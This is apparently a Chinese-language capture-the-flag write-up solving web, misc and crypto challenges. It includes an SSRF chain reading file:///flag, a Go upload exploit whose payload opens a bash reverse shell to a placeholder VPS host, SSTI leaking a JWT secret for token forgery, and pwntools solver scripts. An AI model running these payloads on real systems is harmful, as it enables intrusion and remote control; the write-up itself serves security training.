0x01 Web
========

Power Cookie
------------

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ef67a525e35c4039cd214a26613e3c79ac303859.png)

魔法浏览器
-----

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-40bbe5bedebd274bc4b0d1bd09a49ecafcd417a7.png)

ezcms
-----

getcurl这个函数存在一个SSRF的漏洞点：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2e88630ce78b9304bcd887d17b0252a580921a21.png)

然后在/sys/apps/controllers/api/Qpic.php文件中存在对这个函数的调用：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1140d6bc03436c10f10a2735616216afe70b8f86.png)

需要注意的是这里用sys\_auth函数对URL进行了一次编码，跟进这个函数：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1ee82047882294d4c95a610076704e8e88f80b3e.png)

很贴心的自带编码模式，0是加密，1是解密，然后Mc\_Encryption\_Key可以在html/sys/libs/db.php中找到：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-96122e8b8c2a30d38584ce77cd347e43f5f68fb4.png)

这样对file:///flag进行一次编码得到：

fc4ce2w9LD-P6QkYICFFPlJz7xuNL7ja9NawGYR3JmxFc1uAdIOgEWc

然后直接传进去就能读到flag文件：

index.php/api/qpic/img?str=fc4ce2w9LD-P6QkYICFFPlJz7xuNL7ja9NawGYR3JmxFc1uAdIOgEWc

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9255ea414b5304266ec96b7930bed31217422847.png)

getme
-----

Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 （CVE-2021-42013）

[https://blog.csdn.net/weixin\_46187013/article/details/122454511](https://blog.csdn.net/weixin_46187013/article/details/122454511)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-41ffadfd9508e5ac13b8eadbf89aa20caec5b732.png)

hackme
------

go RCE，有一个go文件上传点，然后在访问/users路由发现提示找不到users.go文件，因此猜测users路由会解析users.go文件，因此直接写一个含有反弹Shell命令的users.go：

```go
package main

import (
    "bytes"
    "fmt"
    "log"
    "os/exec"
)

var cmd = \`
bash -c 'exec bash -i &>/dev/tcp/VPS\_IP/PORT <&1'
\`
func main() {
    cmd := exec.Command("sh","-c",cmd)
    var stdout, stderr bytes.Buffer
    cmd.Stdout = &stdout
    cmd.Stderr = &stderr
    err := cmd.Run()
    outStr, errStr := string(stdout.Bytes()), string(stderr.Bytes())
    fmt.Printf("out:\\n%s\\nerr:\\n%s\\n", outStr, errStr)
    if err != nil {
        log.Fatalf("cmd.Run() failed with %s\\n", err)
    }
}
```

上传完成后访问users路由即可获得Shell：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b0c9ab273488b29d9c8ce3fa3f081e72a92cb69f.png)

fxxkgo
------

go ssti + jwt伪造

首先注册一个用户：{{.}}

/register  
POST: id={{.}}&amp;pw=123

然后auth一下获得token：

/auth  
POST: id={{.}}&amp;pw=123

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-903c7090efab5d685c076bf0a9cd7570cceb4e1c.png)

把token添加到X-Token头里去POST请求根路由触发ssti：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ce980af7c512a985162f5b3ad409c9ee7090a009.png)

就可以获得jwt的密钥：fasdf972u1041xu90zm10Av

然后去jwt.io伪造一下jwt：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c9d7fc719ddb5112b314a59639763315d940c4f5.png)

is\_admin修改为true，然后替换X-Token头为我们伪造的jwt去请求flag路由：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-fc5e2b809553fc500dbb3851f5e393c627a00d0e.png)

0x02 MISC
=========

不懂PCB的厨师不是好黑客
-------------

搜索关键字

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6cbbb504efa9f926e8235955acb607eff407a6e7.png)

卡比
--

网上找到密码表，对照进行解码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-96a27bb0540d0b4e8e85b5ffda9827593c360246.png)

PTRH{GWDVSWVQBFISZSZ}

维吉尼亚密码，逆推一下KEY：kirby

解码得到flag：FLAG{IMVERYLIKEKIRBY}

改为小写然后套上flag格式即可

神必流量
----

binwalk分析流量包发现7z文件，使用010找到对应位置的16进制数据另存出来

发现为加密压缩包

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-13d5c1da9ffc9f50907c253eef34df6005babcfb.png)

发现密码为123456

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6f6023964984daffec83d4a48ecb6ca3ac9fb732.png)

解开ZIP得到一个谷歌网页，下载下来得到

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f685bb449593a586cbf8a6f10658ac9bcfaa7dda.png)

密码在注释中为123456

然后逆向异或key 6603

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6cf18102bfa9bcb84bc2020040c97a3b20e060ce.png)

DASCTF{6f938f4c-f850-4f04-b489-009c2ed1c4fd}

rootme
------

SUID提权 date命令读文件

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-cfe761eaf71fb04505b08bb8bbc5b1af596a7b66.png)

0x03 Crypto
===========

**Yusa的密码学课堂——一见如故**
--------------------

z3逆回去拿状态

```python
 def cs2l( y, shift):
     return ((y << shift) ^ (y >> (32 - shift))) & 0xffffffff

 def cs2r( y, shift):
     return ((y >> shift) ^ (y << (32 - shift))) & 0xffffffff
 ​
 from z3 import \*
 from tqdm import trange
 def gao(y\_1):
     x\_1=BitVec('x\_1', 32)
     s=Solver()
     tmp = x\_1 ^ RotateLeft(x\_1, 11) ^ RotateLeft(x\_1, 15)
     tmp = tmp ^ RotateRight(tmp,7) ^ RotateRight(tmp,19)
 ​
     s.add(y\_1 == tmp)
     s.check()
     return (s.model().eval(x\_1))
 ​
 f = open("./output.txt","r")
 output = eval(f.read().strip())
 state = \[\]
 f.close()
 for i in trange(len(output)):
     state.append(int(str(gao(output\[i\]))))
 ​
 f = open("./state.txt",'w')
 f.write(str(state))
 f.close()

直接代入状态

 f=open(r'./state.txt','r')
 s = eval(f.read().strip())
 print(s)
 class Myrand():
     def \_\_init\_\_(self,state):
         self.MT = state
         self.index=0
 ​
     def generate(self):
         for i in range(624):
             y = (self.MT\[i\] & 0x80000000) + (self.MT\[(i+1)%624\] & 0x7fffffff)
             self.MT\[i\] = self.MT\[(i+397)%624\] ^ (y >> 1)
             if y & 1:
                 self.MT\[i\] ^= 2567483520
 ​
     def rand(self):
         if self.index == 0:
             self.generate()
         y = self.MT\[self.index\]
         y = y ^ self.cs2l(y, 11) ^ self.cs2l(y,15)
         y = y ^ self.cs2r(y,7) ^ self.cs2r(y,19)
         self.index = (self.index + 1) % 624
         return y
 ​
     def cs2l(self, y, shift):
         return ((y << shift) ^ (y >> (32 - shift))) & 0xffffffff

     def cs2r(self, y, shift):
         return ((y >> shift) ^ (y << (32 - shift))) & 0xffffffff
 ​
 r = Myrand(s)
 from hashlib import md5
 flag = 'DASCTF{' + md5(str(r.rand()).encode()).hexdigest() + '}'
 print(flag)
```

**Yusa的密码学课堂——二眼深情**
--------------------

MT\[227\] = MT\[0\] ^ ((MT\[227\]\_h(brute 0/1) + MT\[228\])&gt;&gt;1)

拿227和0，228是后面的没有被干扰到，所以用228去恢复seed即可。大概概率1/4的机率 是准确的数

```python
 from gmpy2 import invert
 from z3 import \*
 ​
 def cs2l( y, shift):
     return ((y << shift) ^ (y >> (32 - shift))) & 0xffffffff

 def cs2r( y, shift):
     return ((y >> shift) ^ (y << (32 - shift))) & 0xffffffff
 ​
 def gao(y\_1):
     x\_1=BitVec('x\_1', 32)
     s=Solver()
     tmp = x\_1 ^ RotateLeft(x\_1, 11) ^ RotateLeft(x\_1, 15)
     tmp = tmp ^ RotateRight(tmp,7) ^ RotateRight(tmp,19)
 ​
     s.add(y\_1 == tmp)
     s.check()
     return (s.model().eval(x\_1))
 ​
 def \_int32(x):
     return int(0xFFFFFFFF & x)
 ​
 def invert\_right(res,shift):
     tmp = res
     for i in range(32//shift):
         res = tmp^res>>shift
     return \_int32(res)
 ​
 def recover(last,index):
     n = 1<<32
     inv = invert(2037740385,n)
     for i in range(index,0,-1):
         last = ((last-1)\*inv)%n
         last = invert\_right(last,30)
     return last
 ​
 def get\_sec(tmp1,tmp2):
     t\_1 = int(str(gao((tmp1))))
     t\_2 = int(str(gao((tmp2))))
 ​
     y = (t\_2^t\_1 & 0x7fffffff)<<1
 ​
     seed = recover(y,228)
     print(seed)
     return seed
 ​
 from pwn import \*
 for i in range(10):
     io = remote("node4.buuoj.cn",26148)
 ​
     io.recvuntil(b'Your first see:')
     io.sendline(str(227).encode())
     tmp1 = eval(io.recvline().strip())
 ​
     io.recvuntil(b'You konw my secret?')
     io.sendline(str(1).encode())
 ​
     io.recvuntil(b'Your second see: ')
     io.sendline(str(0).encode())
     tmp2 = eval(io.recvline().strip())
 ​
     print(tmp1,tmp2)
     io.recvuntil(b'You konw my secret?')
     secret = get\_sec(tmp1,tmp2)
     io.sendline(str(secret).encode())
     print(io.recv())
     tmp = (io.recv())
     print(tmp)
     if tmp == b'For you ~\\n':
         io.interactive()
     io.close()

```

**Yusa的密码学课堂——三行情书**
--------------------

由经验可知，取其中624\*32bit个对应的，直接取值然后丢进去搞，z3给最初的state，然后每一位搞，搞出来624\*32条方程即出。